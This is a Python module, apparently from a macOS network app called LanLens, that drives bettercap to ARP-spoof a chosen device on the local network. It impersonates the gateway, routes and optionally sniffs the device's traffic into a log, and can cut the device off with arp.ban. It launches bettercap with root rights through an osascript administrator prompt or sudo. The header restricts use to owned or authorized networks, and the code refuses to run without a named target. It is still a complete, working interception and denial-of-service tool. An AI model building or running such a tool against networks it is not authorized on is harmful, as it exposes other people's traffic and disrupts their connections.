"""
netreg_mitm.py -- route a device's traffic through this machine (ARP spoofing).

====================  OWN-NETWORK / AUTHORIZED USE ONLY  ====================
This makes your computer impersonate the router (the gateway) so a chosen
device's traffic flows through your machine. It is lawful ONLY on a network you
own or are explicitly authorized to test. The GUI gates it behind an explicit
confirmation; this module refuses to build a command without a target.
============================================================================

Implementation: we drive **bettercap** (install with `brew install bettercap`).
bettercap's `arp.spoof` module does the gateway impersonation and, on exit,
sends the correct ARP replies to heal the network. bettercap needs root, so on
macOS we launch it through an administrator-privileges prompt.

Most of this module is pure command construction (unit-tested). Actually
starting bettercap needs root + the binary + a real network, so that path is
exercised on the target machine, not in CI.
"""
from __future__ import annotations

import os
import shutil
import signal
import subprocess
import sys
import tempfile
import threading


# Common install locations to check when bettercap isn't on PATH. A macOS app
# launched from Finder (double-clicking LanLens.app or run.command) inherits a
# minimal PATH — typically /usr/bin:/bin:/usr/sbin:/sbin — that does NOT include
# Homebrew's bin dir, so `which bettercap` fails even though `brew install
# bettercap` succeeded in the user's terminal. Check the usual spots directly.
_BETTERCAP_DIRS = (
    "/opt/homebrew/bin",      # Homebrew on Apple Silicon
    "/usr/local/bin",         # Homebrew on Intel macOS
    "/opt/local/bin",         # MacPorts
    "/usr/bin",
    "/bin",
)


def bettercap_path() -> str:
    """Absolute path to the bettercap binary, or "" if not found. Tries PATH
    first, then the common install dirs that a Finder-launched app can't see."""
    found = shutil.which("bettercap")
    if found:
        return found
    name = "bettercap.exe" if sys.platform.startswith("win") else "bettercap"
    for d in _BETTERCAP_DIRS:
        cand = os.path.join(d, name)
        if os.path.isfile(cand) and os.access(cand, os.X_OK):
            return cand
    return ""


def default_log_path() -> str:
    """Where bettercap's sniffed-traffic summary is written so the GUI can tail
    it. ~/Library/Logs on macOS (readable by the user, writable by the root
    bettercap process), the system temp dir elsewhere."""
    mac_logs = os.path.join(os.path.expanduser("~"), "Library", "Logs")
    if sys.platform == "darwin" and os.path.isdir(mac_logs):
        return os.path.join(mac_logs, "LanLens-traffic.log")
    return os.path.join(tempfile.gettempdir(), "netreg_traffic.log")


def available() -> bool:
    """True if bettercap is installed."""
    return bool(bettercap_path())


def preflight() -> tuple[bool, str]:
    """(ready, message). Explains what to install if not ready."""
    if not available():
        return False, ("bettercap is not installed. Install it with "
                       "`brew install bettercap` (the one-click launcher does "
                       "this for you), then try again.")
    return True, "bettercap found."


def build_eval(target_ip: str, full_duplex: bool = True,
               sniff: bool = False, ban: bool = False) -> str:
    """Build the bettercap -eval command string that impersonates the gateway
    for `target_ip`. Raises ValueError without a target (safety: never spoof
    the whole subnet by accident). bettercap discovers the gateway itself.

    When `ban` is True, use bettercap's `arp.ban` instead of `arp.spoof`: the
    target still sends its traffic to this machine, but we DON'T forward it on
    to the router, so the device loses its connection while staying associated
    to the Wi-Fi. (Plain `arp.spoof` keeps forwarding, so the device still
    works and its traffic merely flows through us.)"""
    target_ip = (target_ip or "").strip()
    if not target_ip:
        raise ValueError("a target IP is required (refusing to spoof the whole network)")
    cmds = [
        f"set arp.spoof.targets {target_ip}",
        f"set arp.spoof.fullduplex {'true' if full_duplex else 'false'}",
        "net.probe on",
        "arp.ban on" if ban else "arp.spoof on",
    ]
    if sniff:
        # Keep the summary readable: verbose events, limited to the target's
        # own traffic (a BPF host filter) so the pane isn't flooded.
        cmds += [
            "set net.sniff.verbose true",
            f"set net.sniff.filter host {target_ip}",
            "net.sniff on",
        ]
    return "; ".join(cmds)


def build_argv(target_ip: str, iface: str | None = None,
               full_duplex: bool = True, sniff: bool = False,
               ban: bool = False) -> list[str]:
    """Full bettercap argv (without the privilege wrapper). Verifiable."""
    binary = bettercap_path() or "bettercap"
    argv = [binary]
    if iface:
        argv += ["-iface", iface]
    argv += ["-eval", build_eval(target_ip, full_duplex, sniff, ban)]
    return argv


def _sh_quote(s: str) -> str:
    """Single-quote a string for the /bin/sh that osascript runs."""
    return "'" + s.replace("'", "'\\''") + "'"


def _mac_admin_command(argv: list[str], log_path: str | None = None) -> list[str]:
    """Wrap argv so macOS shows a GUI password prompt (osascript). The spoof
    runs in the background; `stop()` kills it by name. When `log_path` is given,
    bettercap's output is redirected there so the GUI can show the traffic
    summary; otherwise it's discarded."""
    quoted = " ".join(_sh_quote(a) for a in argv)
    redirect = f"&> {_sh_quote(log_path)}" if log_path else "&> /dev/null"
    script = (f'do shell script "{quoted} {redirect} &" '
              f'with administrator privileges')
    return ["osascript", "-e", script]


class RouteSession:
    """Start/stop routing a target's traffic through this machine.

    Lifecycle: preflight() -> start(target_ip) -> stop(). Always call stop()
    (or let the GUI call it on close) so bettercap heals the ARP tables."""

    def __init__(self, iface: str | None = None):
        self.iface = iface
        self._proc: subprocess.Popen | None = None
        self._target = ""
        self._ban = False  # True while cutting a device off (arp.ban, no forward)
        self._lock = threading.Lock()
        # Set while sniffing: the file bettercap writes its traffic summary to,
        # which the GUI tails. None when capture is off.
        self.log_path: str | None = None
        self._logf = None

    def is_running(self) -> bool:
        with self._lock:
            if self._proc is None:
                return False
            return self._proc.poll() is None

    def start(self, target_ip: str, full_duplex: bool = True,
              sniff: bool = False, ban: bool = False) -> tuple[bool, str]:
        ready, msg = preflight()
        if not ready:
            return False, msg
        if self.is_running():
            verb = "cutting off" if self._ban else "routing"
            return False, f"Already {verb} {self._target}."
        try:
            argv = build_argv(target_ip, self.iface, full_duplex, sniff, ban)
        except ValueError as e:
            return False, str(e)
        self._ban = ban

        # When capturing, give bettercap a log file to write to and start it
        # empty so the GUI only sees this session's traffic.
        self.log_path = default_log_path() if sniff else None
        if self.log_path:
            try:
                open(self.log_path, "w").close()
            except Exception:
                self.log_path = None

        if sys.platform == "darwin":
            launch = _mac_admin_command(argv, self.log_path)  # GUI password prompt
            popen_out = subprocess.DEVNULL  # bettercap output goes to log_path
        else:
            launch = ["sudo"] + argv
            if self.log_path:
                try:
                    self._logf = open(self.log_path, "a")
                    popen_out = self._logf
                except Exception:
                    self._logf = None
                    popen_out = subprocess.DEVNULL
            else:
                popen_out = subprocess.DEVNULL

        try:
            # On macOS the osascript wrapper backgrounds bettercap itself and
            # returns immediately; elsewhere we hold the sudo child handle.
            self._proc = subprocess.Popen(launch, stdout=popen_out,
                                          stderr=popen_out)
            self._target = target_ip
        except Exception as e:
            return False, f"Could not start bettercap: {e}"
        tail = (" Traffic summary will appear below." if self.log_path else "")
        if ban:
            return True, (f"Cutting off {target_ip}: its traffic reaches this "
                          f"machine but is NOT forwarded to the router, so the "
                          f"device loses its connection while staying on the "
                          f"Wi-Fi. Press Stop to restore it.{tail}")
        return True, (f"Routing {target_ip}'s traffic through this machine "
                      f"(impersonating the gateway). Press Stop to restore the "
                      f"network.{tail}")

    def stop(self) -> tuple[bool, str]:
        """Stop spoofing and restore the network."""
        with self._lock:
            proc = self._proc
            self._proc = None
        if self._logf is not None:
            try:
                self._logf.close()
            except Exception:
                pass
            self._logf = None
        # terminate the handle we hold (sudo path)
        if proc is not None and proc.poll() is None:
            try:
                proc.terminate()
            except Exception:
                pass
        # the macOS admin path backgrounds bettercap under a different pid, so
        # also ask it to quit by name; bettercap heals ARP on shutdown.
        killed = False
        if shutil.which("pkill"):
            try:
                subprocess.run(["pkill", "-INT", "-x", "bettercap"],
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                killed = True
            except Exception:
                killed = False
        if not self._target:
            return True, "Nothing was running."
        target, self._target = self._target, ""
        was_ban, self._ban = self._ban, False
        verb = "cutting off" if was_ban else "routing"
        return True, (f"Stopped {verb} {target}. bettercap restored the ARP "
                      f"tables; the device's connection is back to normal."
                      + ("" if killed else " (If it's still affected, quit "
                         "bettercap manually.)"))


if __name__ == "__main__":
    # Safe self-check: command construction only, no bettercap launched.
    print("bettercap available:", available())
    print("eval for 192.168.1.211:", build_eval("192.168.1.211"))
    try:
        build_eval("")
    except ValueError as e:
        print("empty target correctly refused:", e)
